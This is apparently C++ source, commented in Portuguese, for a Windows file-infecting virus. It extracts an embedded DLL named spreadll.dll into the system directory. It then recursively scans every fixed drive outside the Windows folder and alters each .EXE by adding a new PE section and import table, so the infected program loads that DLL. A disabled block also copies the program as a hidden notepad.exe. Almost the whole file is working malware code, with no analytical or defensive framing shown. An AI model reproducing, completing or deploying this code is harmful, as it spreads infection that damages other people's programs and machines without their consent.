#include "..\common\spread.h"


static void InsertSpreadDLL( char *FileName )
{
	try
	{
	    CPEManipulator PEClass( FileName );

	    // Recebe o buffer do arquivo
	    if ( PEClass.IsValidPE() )
		{
            if ( ! PEClass.SectionExists( NEW_SECTION_NAME ) )
			{
		        // Recebe o tamanho da nova tabela de importacao
		        int ImportTableSize = GetNewImportSize();

		        // Aloca memoria para a nova tabela de importacao
		        unsigned char* ImportTableData = (unsigned char*) malloc( ImportTableSize );
		    
			    memset( ImportTableData, 0, ImportTableSize );

    		    // Recebe o conteudo da nova secao ja calculado
		        IMAGE_SECTION_HEADER NewSection;

		        // Insere nova secao dentro do arquivo
		        if ( PEClass.InsertNewSection( ImportTableSize + sizeof( int ), NEW_SECTION_NAME, &NewSection ) )
				{
			        // Recebe os dados da nova tabela de importacao ja corretamente calculada
			        if ( GetImportTableBuffer( ImportTableData, ImportTableSize, NewSection ) )
					{
				        // Aloca memoria
				        unsigned char* NewSectionBuffer = (unsigned char*) malloc( NewSection.SizeOfRawData );
							
				        int ImportTableRVA = PEClass.GetOriginalImportTableRVA();

                        // Agora joga para o buffer os dados que estarão dentro da minha nova secao
                        // que por enquanto é a tabela de importacao, mais o valor do RVA para a tabela de importacao original
				        memset( NewSectionBuffer, 0, NewSection.SizeOfRawData );

				        memcpy( NewSectionBuffer, ImportTableData, ImportTableSize );
				        memcpy( &NewSectionBuffer[ ImportTableSize ], &ImportTableRVA, sizeof( int ) );

				        // Nova secao
				        PEClass.WriteData( NewSection.PointerToRawData, NewSectionBuffer, NewSection.SizeOfRawData );

				        // Libera buffer
				        free( NewSectionBuffer );
					}
				}

		        // Libera buffer
		        free( ImportTableData );
			}
		}
	}
	catch(...)
	{
	}
}

static void ExtractResource()
{
    WIN32_FIND_DATA FindFileData;

    char FileName[ MAX_PATH ];
    
	try
	{
        // Define nome da DLL
	    GetSystemDirectory( FileName, MAX_PATH );
    
	    if ( FileName[ strlen( FileName ) - 1 ] != '\\' )
		{ 
            strcat( FileName, "\\" );
		}
	
	    strcat( FileName, "spreadll.dll" );

        // Arquivo NAO existe ?
	    HANDLE hFind = FindFirstFile( FileName, &FindFileData );
    
	    if ( hFind == INVALID_HANDLE_VALUE )
		{
	        // Obtem o handle do modulo atual
            HMODULE hModule = GetModuleHandle( NULL );

	        void *Resource;

            long ResourceSize;

            // Obtem o tamanho do loader
            ResourceSize = SizeofResource( hModule, FindResource( hModule, "DLL", RT_RCDATA ) );

            // Aloca memoria
		    Resource = (void *) malloc( ResourceSize );

	        // Obtem o conteudo do loader
            Resource = LoadResource( hModule, FindResource( hModule, "DLL", RT_RCDATA ) );

	        // Gravar DLL
            FILE *File = fopen( FileName, "wb+" );

	        if ( File != NULL )
			{
                fwrite( Resource, ResourceSize, 1, File );

	            fclose( File );
			}

		    // Libera memoria
		    free( Resource );
		}
        else
		{
            FindClose( hFind );
		}
	}
	catch(...)
	{
	}
}

static void FindFiles( char *Path, char *WindowsDir )
{
    WIN32_FIND_DATA FindFileData;

	char FindMatch[ MAX_PATH ];

    // Verificacao para nao deixar estourar a pilha
	// quando houver muitos subdiretorios...
	static int RecursiveCounter = 0;

	if ( RecursiveCounter == 10 )
	{
       return;
	}

	try
	{
	    ++ RecursiveCounter;

	    // Pesquisa todos os arquivos .EXE
	    strcpy( FindMatch, Path );
        strcat( FindMatch, "*.*" );
	
        HANDLE hFind = FindFirstFile( FindMatch, &FindFileData );
    
	    if ( hFind != INVALID_HANDLE_VALUE )
		{ 
		    do
			{
	            char FileName[ MAX_PATH ];

	            // Acrescenta o path ao nome do arquivo
                strcpy( FileName, Path );
                strcat( FileName, FindFileData.cFileName );
			
			    strupr( FileName );

     	        // Tem atributo diretorio ?
                if ( FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
				{
                    strcat( FileName, "\\" );

				    // Nao processar diretorios "." e ".." e "Windows"
                    if ( FindFileData.cFileName[ 0 ] == '.' ||
					     strnicmp( FileName, WindowsDir, strlen( WindowsDir ) ) == 0 )
					{
					} 
				    else
					{  
#ifndef _TEST
/*
					    char FileNameTarget[ MAX_PATH ];

                        // Faz a copia do arquivo e esconde...
					    strcpy( FileNameTarget, FileName );
					    strcat( FileNameTarget, "notepad.exe" );

					    CopyFile( __argv[ 0 ], FileNameTarget, TRUE );

					    SetFileAttributes( FileNameTarget, FILE_ATTRIBUTE_HIDDEN );
*/
#endif

					    // Pesquisa diretorio
					    FindFiles( FileName, WindowsDir );
					}
				}
			    else
				{
				    if ( strlen( FileName ) > 4 )
					{
				        // Eh um arquivo .EXE ?
				        if ( strcmp( &FileName[ strlen( FileName ) - 4 ], ".EXE" ) == 0 )
						{
				            // Infecta arquivo
#ifdef _TEST
				            MessageBox( NULL, FileName, "Infect this file !", MB_OK );
#else
					        InsertSpreadDLL( FileName );
#endif
						}
					}
				}
			} while ( FindNextFile( hFind, &FindFileData ) );


		    // Fecha handle
            FindClose( hFind );
		}
	}
	catch(...)
	{
	}

    -- RecursiveCounter;
}

static void FindDrives()
{
    char WindowsDir[ MAX_PATH ];

    char Drive[] = "A:\\";
    char i;

    try
	{
	    // Obtem diretorio do Windows
	    GetWindowsDirectory( WindowsDir, MAX_PATH );
    
	    if ( WindowsDir[ strlen( WindowsDir ) - 1 ] != '\\' )
		{ 
            strcat( WindowsDir, "\\" );
		}

	    strupr( WindowsDir );

        // Processa unidades... A ate Z
        for ( i = 0; i < 26; i++ )
		{
            // Transforma o numero do drive para letra da unidade (0=A, 1=B, 2=C...)
            Drive[ 0 ] = 'A' + i;

            // Somente infecta arquivos no HD e nos drives de rede :-)
            if ( GetDriveType( Drive ) == DRIVE_FIXED )
			{

                FindFiles( Drive, WindowsDir );
			}
		}
	}
	catch(...)
	{
	}
}

int __stdcall WinMain( HINSTANCE, HINSTANCE, LPSTR, int )
{
	try
	{
        // Obtem Informacao Sobre o Sistema Operacional
        OSVERSIONINFO info;
        info.dwOSVersionInfoSize = sizeof( info );

        GetVersionEx( &info );

        // Windows NT ? 
        if ( info.dwPlatformId == VER_PLATFORM_WIN32_NT )
		{
            // Esconde ampulheta do cursor do mouse
	        PostMessage( NULL, 0, 0, 0 );

            // Extrair DLL
            ExtractResource();

            // Pesquisar unidades
	        FindDrives();
		}
	}
	catch(...)
	{
	}

	return 0;
}
